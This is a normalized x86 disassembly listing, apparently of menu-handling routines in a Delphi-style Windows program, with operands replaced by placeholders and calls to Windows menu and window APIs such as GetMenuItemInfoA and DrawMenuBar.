push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov [ esp ] 0x0
test bl bl
jne r-xdata
xor eax eax
mov [ esp + 0x4 ] eax
xor ebp ebp
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_44c7a4
mov edi eax
dec edi
sub edi ebx
jl r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov ebx [ esp + 0x4 ]
mov eax esi
call sub_44c7a4
mov edi eax
dec edi
sub edi ebx
jl r-xdata
inc edi
mov al [ esp ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_44d9e4
test al al
je r-xdata
mov eax esi
call sub_44c7a4
mov ebx eax
dec ebx
mov edi [ esp + 0x4 ]
sub edi ebx
jg r-xdata
inc edi
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_44c7b4
call sub_44d83c
test al al
je r-xdata
dec edi
mov edx ebx
mov eax esi
call sub_44c7b4
cmp [ eax + 0x3e ] 0x0
je r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_44c7b4
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov [ esp + 0x4 ] ebx
jmp r-xdata
mov edx ebx
mov eax esi
call sub_44c7b4
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
jmp r-xdata
dec ebx
inc edi
jne r-xdata
mov edx ebx
mov eax esi
call sub_44c7b4
call sub_44d83c
test al al
je r-xdata
inc ebx
dec edi
jne r-xdata
test ebp ebp
je r-xdata
mov edx ebx
mov eax esi
call sub_44c7b4
mov ebp eax
jmp r-xdata
cmp [ ebp + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_44c7b4
cmp [ eax + 0x3e ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_44c7b4
mov [ eax + 0x3e ] 0x0
mov [ esp ] 0x1
mov edx ebx
mov eax esi
call sub_44c7b4
call sub_44d83c
test al al
je r-xdata
xor ebp ebp
mov [ esp + 0x4 ] ebx
cmp [ ebp + 0x3e ] 0x0
jne r-xdata
mov [ ebp + 0x3e ] 0x0
mov [ esp ] 0x1
mov [ ebp + 0x3e ] 0x1
mov [ esp ] 0x1
sub_44d9b8
push ebx
mov ebx eax
mov al [ ebx + 0x3b ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_44d9b8
and eax 0x7f
mov al [ eax + rw-data ]
sub_44d9e4
push ebx
mov ebx eax
mov al [ ebx + 0x3c ]
cmp al 0x2
jne r-xdata
and eax 0x7f
mov al [ eax + rw-data ]
pop ebx
retn
cmp [ ebx + 0x64 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
call sub_44d9e4
and eax 0x7f
mov al [ eax + rw-data ]
sub_44da10
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
test dl dl
je r-xdata
mov edi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_44a6f8
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0x84 ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x38 ]
mov [ esi + 0x80 ] eax
mov [ esi + 0x70 ] ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov esi eax
mov [ ebx + 0x44 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] r-xdata
mov [ ebx + 0x41 ] 0x1
mov ecx edi
xor edx edx
mov eax ebx
call sub_419a50
mov eax [ ebx + 0x34 ]
mov [ eax + 0x3b ] 0x0
mov [ eax + 0x3c ] 0x0
mov eax ebx
call sub_44e73c
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_44daac
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x34 ]
call sub_403198
mov eax [ esi + 0x44 ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419a9c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_44db20
push ebx
push esi
mov esi eax
xor ebx ebx
mov eax sub_44db20
mov ecx esi
mov edx [ esi + 0x68 ]
call sub_44a264
push 0x1
mov ecx esi
mov edx esi
mov eax esi
call sub_44cba8
mov eax ebx
pop esi
pop ebx
retn
sub_44db60
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x50 ]
cmp eax edx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp eax [ ebx + 0x34 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] ebx
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax ebx
call sub_44c7a4
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
movzx edx [ ebx + 0x60 ]
cmp eax edx
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax ebx
call sub_44c7b4
call sub_44db60
pop ecx
test al al
je r-xdata
sub_44dbf8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] cl
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0xc ] edx
mov ecx sub_44db60
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_44a264
mov eax [ ebp - 0xc ]
pop ebx
mov esp ebp
pop ebp
retn
sub_44dc28
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebp edx
mov esi eax
xor edi edi
mov bl 0x1
cmp [ esp ] 0x0
je r-xdata
cmp bl 0x1
jne r-xdata
xor ebx ebx
mov ecx ebx
mov edx ebp
mov eax esi
call sub_44dbf8
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x34 ]
cmp ebp eax
jne r-xdata
test eax eax
je r-xdata
cmp [ eax + 0x54 ] 0x0
je r-xdata
mov eax esi
call sub_44ef4c
mov edi eax
jmp r-xdata
mov eax edi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ eax + 0x54 ]
mov eax [ eax + 0x64 ]
sub_44dc98
push ebx
xor ebx ebx
movzx edx dx
xor ecx ecx
call sub_44dbf8
test eax eax
je r-xdata
mov eax ebx
pop ebx
retn
mov edx [ eax ]
call [ edx + 0x44 ]
mov bl 0x1
sub_44dcb4
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
mov cl 0x1
mov eax esi
call sub_44dbf8
mov edi eax
test edi edi
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x44 ]
xor edx edx
mov eax edi
call sub_44d364
mov ebx eax
xor edx edx
mov eax edi
call sub_44d860
or bl al
test bl bl
je r-xdata
mov eax edi
call sub_44cccc
mov eax [ esi + 0x34 ]
call sub_44cccc
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
mov eax edi
call sub_44ac08
mov bl 0x1
jmp r-xdata
mov edx [ rw-data ]
mov ebx eax
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp edi [ ebx + 0x258 ]
jne r-xdata
push 0x0
push 0x0
push 0x234
mov eax [ ebx + 0x254 ]
push eax
call SendMessageA
test eax eax
je r-xdata
mov eax ebx
call sub_440d58
push eax
call DrawMenuBar
sub_44dda0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea edx [ esi + 0x1 ]
lea eax [ ebp - 0x8 ]
call sub_44dda0
pop ecx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub al 0x3
je r-xdata
cmp [ ebp - 0x1 ] 0x2
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
xor eax eax
push ebp
push j_sub_403638#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp + 0x8 ]
movzx edx [ eax - 0x6 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov cl 0x2
call sub_44dbf8
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
mov eax [ ebx ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_44cccc
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_44dd90
mov [ ebx ] eax
cmp [ ebx ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x3
jmp r-xdata
mov [ ebp - 0x1 ] 0x2
mov eax [ ebx ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x64 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
cmp ax [ edx - 0x6 ]
je r-xdata
test esi esi
jne r-xdata
mov [ ebp - 0x1 ] 0x1
sub_44def4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0xc ] eax
xor eax eax
xor edx edx
mov dl [ ebx + 0x4 ]
mov [ ebp - 0x6 ] dx
cmp [ ebp - 0x6 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
add [ ebp - 0x6 ] 0x2000
test [ ebx + 0xb ] 0x20
je r-xdata
add [ ebp - 0x6 ] 0x4000
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0x14 ] eax
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_4244d8
xor eax eax
push ebp
push sub_44dff2
push [ fs : eax ]
mov [ fs : eax ] esp
add [ ebp - 0x6 ] 0x8000
cmp [ ebp - 0x14 ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_4244d8
xor eax eax
push ebp
push sub_44dfc7
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_44dda0
pop ecx
mov [ ebp - 0xd ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_4244d0
retn
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44dff9
mov eax [ rw-data ]
call sub_4244d0
retn
cmp [ ebp - 0xd ] 0x2
je r-xdata
mov [ ebp - 0xd ] 0x0
movzx edx [ ebp - 0x6 ]
mov cl 0x2
mov eax [ ebp - 0xc ]
call sub_44dbf8
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_44e018
push ebx
push esi
add esp 0xffffff80
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
add esp 0x80
pop esi
pop ebx
retn
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
mov esi eax
mov [ esp ] 0x2c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x30 ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x50
push esp
push 0xffffffff
push 0x0
push esi
call GetMenuItemInfoA
test eax eax
je r-xdata
mov eax ebx
call sub_44e39c
mov edx [ esp + 0x8 ]
and edx 0x6000
cmp edx 0x1
sbb edx edx
inc edx
cmp al dl
je r-xdata
mov eax ebx
call sub_44e39c
and eax 0x7f
shl eax 0xd
lea eax [ eax + eax * 2 ]
mov edx [ esp + 0x8 ]
and edx 0xffff9fff
or eax edx
mov [ esp + 0x8 ] eax
mov [ esp + 0x4 ] 0x10
push esp
push 0xffffffff
push 0x0
push esi
call SetMenuItemInfoA
test eax eax
je r-xdata
mov eax [ ebx + 0x38 ]
push eax
call DrawMenuBar
sub_44e0d4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
push eax
call GetMenuItemCount
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
lea ebx [ eax - 0x200 ]
mov eax [ ebp + 0x8 ]
add eax 0xfffffffb
mov [ ebp - 0x8 ] eax
xor esi esi
jmp r-xdata
cmp esi [ ebp - 0xc ]
jge r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp ebx [ ebp - 0x8 ]
jb r-xdata
push ebx
mov eax [ ebp - 0x8 ]
sub eax ebx
push eax
push 0x400
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x204 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
call sub_44e670
mov eax ebx
call sub_4086dc
mov ebx eax
push 0x400
push esi
mov eax [ ebp - 0x4 ]
push eax
call GetMenuState
test al 0x2
je r-xdata
test al 0x40
je r-xdata
mov [ ebx ] 0x24
inc ebx
mov [ ebx ] 0x0
test al 0x1
je r-xdata
mov [ ebx ] 0x40
inc ebx
mov [ ebx ] 0x0
mov [ ebx ] 0x3b
inc ebx
mov [ ebx ] 0x0
inc esi
mov [ ebx ] 0x23
inc ebx
mov [ ebx ] 0x0
sub_44e174
push ebp
mov ebp esp
add esp 0xfffffdfc
push ebx
mov [ ebp - 0x204 ] eax
xor ebx ebx
mov [ ebp - 0x200 ] 0x0
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp - 0x204 ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x204 ]
mov edx [ eax ]
call [ edx + 0x34 ]
call sub_44e0d4
pop ecx
mov bl 0x1
mov eax [ ebp - 0x204 ]
add eax 0x3c
lea edx [ ebp - 0x200 ]
mov ecx 0x200
call sub_404158
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0x3c ]
call sub_4043a8
lea edx [ ebp - 0x200 ]
call sub_4087a0
test eax eax
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_44e208
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x30 ]
mov [ ebp - 0x5 ] al
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x41 ]
mov [ ebp - 0x6 ] dl
xor edx edx
push ebp
push sub_44e278
push [ fs : edx ]
mov [ fs : edx ] esp
test al al
jne r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_44e718
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_44e718
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_44e718
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x6 ]
mov [ eax + 0x41 ] dl
retn
sub_44e284
push ebx
push esi
mov esi edx
mov ebx eax
mov [ ebx + 0x38 ] esi
mov eax ebx
call sub_44e174
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop esi
pop ebx
retn
test esi esi
je r-xdata
cmp [ ebx + 0x41 ] 0x0
je r-xdata
mov eax ebx
call sub_44e208
mov eax ebx
call sub_44e73c
jmp r-xdata
sub_44e2ec
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
mov ax [ r-xdata ]
and ax [ ebx + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov cl [ ebp + 0x8 ]
mov edx esi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
sub_44e334
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x48 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x48 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x44 ]
call sub_448564
mov eax ebx
call sub_44db48
pop esi
pop ebx
retn
mov edx [ ebx + 0x44 ]
call sub_4485a8
mov edx ebx
mov eax [ ebx + 0x48 ]
call sub_419b20
sub_44e370
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_419d6c
cmp esi [ edi + 0x48 ]
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
xor edx edx
mov eax edi
call sub_44e334
sub_44e3b4
push ebp
mov ebp esp
push esi
xor esi esi
test dl 0x10
je r-xdata
push ecx
push eax
call GetMenuItemID
cmp eax 0xffffffff
je r-xdata
push ecx
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_44dbf8
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
xor ecx ecx
xchg edx eax
call sub_44dbf8
mov esi eax
xor eax eax
xor eax eax
mov al [ ebp + 0x8 ]
mov edx [ esi + 0x30 ]
call sub_4516a0
jmp r-xdata
pop esi
pop ebp
retn 0x4
sub_44e410
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi ecx
mov [ ebp - 0x2 ] dx
xor edx edx
push ebp
push sub_44e4e5
push [ fs : edx ]
mov [ fs : edx ] esp
test [ ebp - 0x2 ] 0x10
je r-xdata
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_44dbf8
mov ebx eax
test ebx ebx
je r-xdata
push esi
push eax
call GetSubMenu
mov edx [ ebp + 0xc ]
mov edx [ edx - 0x4 ]
mov cl 0x1
xchg edx eax
call sub_44dbf8
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
mov eax ebx
call sub_44c7a4
cmp esi eax
jge r-xdata
xor ebx ebx
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44c7b4
mov ebx eax
lea eax [ ebp - 0x8 ]
mov dl [ ebp + 0x8 ]
call sub_4040d0
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_4040d0
mov eax [ ebp - 0xc ]
pop edx
call sub_407dc8
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_44f25c
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e4ec
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403f0c
retn
sub_44e4f8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_44e3b4
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_44e410
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_44e670
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_44dd7c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_44dbf8
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_44dbf8
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_408780
mov eax [ ebp + 0x10 ]
call sub_4086c4
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_44e73c
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_4373fc
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_44e718
mov [ ebx + 0x41 ] 0x1
sub_44e764
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403348
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_44e718
mov [ ebx + 0x41 ] 0x1
sub_44e7f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_44e2ec
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_44e174
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_44e880
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_44e8bc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44e8e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44e908
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44ee3b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44ee42
lea eax [ ebp - 0x30 ]
call sub_403ee8
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414098
mov edx [ esi + 0x4 ]
call sub_44dcb4
test al al
jne r-xdata
